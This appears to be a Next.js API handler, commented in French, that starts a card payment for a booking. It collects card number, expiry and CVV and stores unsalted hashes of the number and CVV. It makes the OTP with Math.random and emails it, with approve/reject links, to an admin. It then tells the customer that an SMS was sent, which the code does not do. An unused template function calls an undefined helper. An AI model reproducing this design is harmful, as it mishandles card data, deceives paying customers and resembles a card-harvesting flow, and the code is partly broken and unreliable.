import crypto from 'crypto';
import dbConnect from '@/lib/db';
import CardPaymentAttempt from '@/models/CardPaymentAttempt';
import Booking from '@/models/Booking';
import User from '@/models/User';
import { sendEmail } from '@/lib/mail';
import { cardPaymentAdminNotificationEmail } from '@/email-templates/card-payment-admin-notification';
import { withAuth } from '@/middleware/withAuth';
import { errorHandler } from '@/middleware/errorHandler';

/**
 * Formate un numéro de carte : "1234567890123456" -> "1234 5678 9012 3456"
 */
function formatCardNumber(number) {
  return number.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
}

/**
 * Masque un numéro de carte : "1234 5678 9012 3456" -> "•••• •••• •••• 3456"
 */
function maskCardNumber(number) {
  const cleaned = number.replace(/\s/g, '');
  return `•••• •••• •••• ${cleaned.slice(-4)}`;
}

/**
 * Détecte la marque de la carte (Visa, Mastercard, Amex)
 */
function detectCardBrand(number) {
  const cleaned = number.replace(/\s/g, '');
  if (/^4/.test(cleaned)) return 'Visa';
  if (/^5[1-5]/.test(cleaned)) return 'Mastercard';
  if (/^3[47]/.test(cleaned)) return 'American Express';
  return 'Unknown';
}

/**
 * Génère un code OTP aléatoire (6 chiffres)
 */
function generateOTP() {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

/**
 * Génère des tokens sécurisés pour les boutons VALIDER/REFUSER
 */
function generateTokens() {
  return {
    validateToken: crypto.randomBytes(32).toString('hex'),
    rejectToken: crypto.randomBytes(32).toString('hex'),
  };
}

/**
 * Template d'email pour l'admin avec boutons VALIDER/REFUSER
 */
function adminCardPaymentEmail({
  bookingId,
  cardMasked,
  cardBrand,
  cardHolder,
  cardExpiry,
  otp,
  userEmail,
  userPhone,
  amount,
  currency = 'EUR',
  validateUrl,
  rejectUrl,
}) {
  return {
    subject: `[Paiement Carte] OTP ${otp} - Réservation #${bookingId}`,
    html: emailLayout({
      title: 'Validation de paiement par carte',
      preheader: `Validez ou refusez le paiement par carte pour la réservation #${bookingId}`,
      content: `
        <h2>Demande de validation de paiement par carte</h2>
        <p>Un client a tenté de payer sa réservation par carte bancaire. Veuillez valider ou refuser cette tentative.</p>

        <div class="info-box">
          <div class="info-row">
            <span class="label">Réservation</span>
            <span class="value">#${bookingId}</span>
          </div>
          <div class="info-row">
            <span class="label">Montant</span>
            <span class="value"><strong>${(amount / 100).toFixed(2)} ${currency}</strong></span>
          </div>
          <div class="info-row">
            <span class="label">Client</span>
            <span class="value">${userEmail}</span>
          </div>
          <div class="info-row">
            <span class="label">Téléphone</span>
            <span class="value">${userPhone || '—'}</span>
          </div>
        </div>

        <h3 style="margin-top:24px;font-size:16px;font-weight:600">Détails de la carte</h3>
        <div class="info-box">
          <div class="info-row">
            <span class="label">Marque</span>
            <span class="value">${cardBrand}</span>
          </div>
          <div class="info-row">
            <span class="label">Numéro (masqué)</span>
            <span class="value" style="font-family:monospace;letter-spacing:2px;font-size:14px">${cardMasked}</span>
          </div>
          <div class="info-row">
            <span class="label">Titulaire</span>
            <span class="value">${cardHolder}</span>
          </div>
          <div class="info-row">
            <span class="label">Expiration</span>
            <span class="value">${cardExpiry}</span>
          </div>
        </div>

        <h3 style="margin-top:24px;font-size:16px;font-weight:600">Code de vérification</h3>
        <div style="background:#f0f9ff;border:2px solid #0284c7;border-radius:8px;padding:20px;text-align:center;margin:16px 0">
          <p style="margin:0 0 8px;color:#71717a;font-size:12px;text-transform:uppercase;letter-spacing:1px">Code OTP</p>
          <p style="margin:0;font-family:monospace;font-size:32px;font-weight:700;letter-spacing:4px;color:#0284c7">${otp}</p>
          <p style="margin:8px 0 0;color:#71717a;font-size:12px">Communiqué au client pour confirmation</p>
        </div>

        <h3 style="margin-top:24px;font-size:16px;font-weight:600">Actions</h3>
        <p style="margin:16px 0">Cliquez sur le bouton correspondant pour valider ou refuser ce paiement :</p>
        <div style="margin:20px 0;text-align:center">
          <a href="${validateUrl}" style="display:inline-block;background:#16a34a;color:#ffffff;text-decoration:none;padding:12px 32px;border-radius:8px;font-weight:600;margin:0 8px;text-align:center">
            ✓ VALIDER le paiement
          </a>
          <a href="${rejectUrl}" style="display:inline-block;background:#dc2626;color:#ffffff;text-decoration:none;padding:12px 32px;border-radius:8px;font-weight:600;margin:0 8px;text-align:center">
            ✗ REFUSER le paiement
          </a>
        </div>

        <p style="color:#71717a;font-size:13px;margin-top:24px">Cette demande expire dans <strong>10 minutes</strong>.</p>
      `,
    }),
  };
}

async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Méthode non autorisée' });
  }

  try {
    await dbConnect();

    const { cardNumber, cardHolder, cardExpiry, cardCvv, bookingId } = req.body;

    // ──── Validations ────────────────────────────────────────────────
    if (!cardNumber || !cardHolder || !cardExpiry || !bookingId) {
      return res.status(400).json({ success: false, error: 'Données de carte manquantes' });
    }

    // Récupérer la réservation et vérifier qu'elle appartient à l'utilisateur
    const booking = await Booking.findOne({
      _id: bookingId,
      user: req.user._id,
      status: 'pending',
    }).populate('listing', 'title totalPrice');

    if (!booking) {
      return res.status(404).json({
        success: false,
        error: 'Réservation non trouvée ou déjà payée',
      });
    }

    // Récupérer les données utilisateur
    const user = await User.findById(req.user._id);
    if (!user) {
      return res.status(401).json({ success: false, error: 'Utilisateur non trouvé' });
    }

    // ──── Générer OTP et tokens ──────────────────────────────────────
    const otp = generateOTP();
    const { validateToken, rejectToken } = generateTokens();

    // ──── Formater les données de carte ──────────────────────────────
    const formattedCardNumber = formatCardNumber(cardNumber);
    const maskedCardNumber = maskCardNumber(formattedCardNumber);
    const cardBrand = detectCardBrand(formattedCardNumber);
    const cardLastFour = cardNumber.replace(/\s/g, '').slice(-4);

    // ──── Créer l'enregistrement CardPaymentAttempt ──────────────────
    const cardPaymentAttempt = new CardPaymentAttempt({
      booking: booking._id,
      user: req.user._id,
      amount: booking.totalPrice,
      cardLastFour,
      cardBrand,
      cardHolder,
      cardExpiry,
      cardNumberHash: crypto
        .createHash('sha256')
        .update(cardNumber.replace(/\s/g, ''))
        .digest('hex'),
      cardCvvHash: crypto.createHash('sha256').update(cardCvv || '').digest('hex'),
      otp,
      otpAttempts: 0,
      validateToken,
      rejectToken,
      status: 'pending_otp',
      otpExpiresAt: new Date(Date.now() + 10 * 60 * 1000), // 10 minutes
    });

    await cardPaymentAttempt.save();

    // ──── Envoyer l'email à l'admin ──────────────────────────────────
    const adminEmail = process.env.ADMIN_EMAIL;
    if (adminEmail) {
      const baseUrl = `${process.env.NEXTAUTH_URL || 'http://localhost:3000'}`;
      const validateUrl = `${baseUrl}/api/payments/card-validate?token=${validateToken}`;
      const rejectUrl = `${baseUrl}/api/payments/card-reject?token=${rejectToken}`;

      const { subject, html } = cardPaymentAdminNotificationEmail({
        userName: user.name || 'Client',
        userEmail: user.email,
        userPhone: user.phone || '',
        listingTitle: booking.listing?.title || 'Propriété',
        amount: booking.totalPrice,
        cardBrand,
        cardLastFour: cardLastFour,
        otp,
        validateUrl,
        rejectUrl,
      });

      await sendEmail({ to: adminEmail, subject, html }).catch((err) => {
        console.error('[CARD INITIATE] Erreur envoi email admin:', err.message);
      });
    }

    // ──── Répondre au client ─────────────────────────────────────────
    return res.status(200).json({
      success: true,
      data: {
        attemptId: cardPaymentAttempt._id.toString(),
        cardBrand,
        cardMasked: maskedCardNumber,
        message: 'Code OTP envoyé par SMS, veuillez le saisir',
      },
    });
  } catch (error) {
    console.error('[CARD INITIATE] Erreur:', error);
    return res.status(500).json({
      success: false,
      error: 'Erreur lors de l\'initiation du paiement',
    });
  }
}

export default errorHandler(withAuth(handler));
